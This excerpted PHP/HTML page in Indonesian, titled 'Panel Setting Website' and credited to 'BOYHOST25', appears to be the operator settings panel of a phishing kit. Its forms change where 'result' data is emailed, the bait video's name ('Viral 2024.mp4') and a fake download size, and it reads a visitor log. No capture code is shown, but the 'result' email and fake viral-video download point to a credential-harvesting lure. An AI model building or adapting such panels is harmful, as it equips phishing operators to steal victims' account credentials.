...
// VISITOR.JSON
$ngVis = file_get_contents("../data/visitor.json");
...
<head>
	...
	<title>Panel Setting Website</title>
	<meta name="description" content="Lebih mudah mengganti nama result, email result, nama video dan ukuran download" />
	<link rel="icon" type="png/image" href="https://telegra.ph/file/bf08ce24e075a91f13db9.jpg" />
...
<body>
	<section>
		...
		<div class="wrap">
			<div class="textBox">
				<h1>Panel Setting Website</h1>
				<p id="quote" style="font-size:15px;">
Maded With ❤️ By <a href="">BOYHOST25</a></p>
				<span id="by"></span>
			</div>
		
			   <div class="pemberitahuan" style="overflow:hidden;margin-top:10px;padding:2px;">
			  <img style="border-radius:3px;max-width:100%;" src="https://i.ibb.co/gWzzhqc/20240504-171109.png">
			  </div>
			...
			<div class="formulir" id="changeEmail" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngEmail" class="form-input" placeholder="Contoh : emailkamu@gmail.com" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
			...
			<div class="formulir" id="changeVideo" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngVideo" class="form-input" placeholder="Contoh : Viral 2024.mp4" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
			...
			<div class="formulir" id="changeUkuran" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngUkuran" class="form-input" placeholder="Contoh : 12,10MB" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
			...
			<div class="pemberitahuan">
				...
				<span id="cUkuran" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Ukuran Video</span>			
			</div>
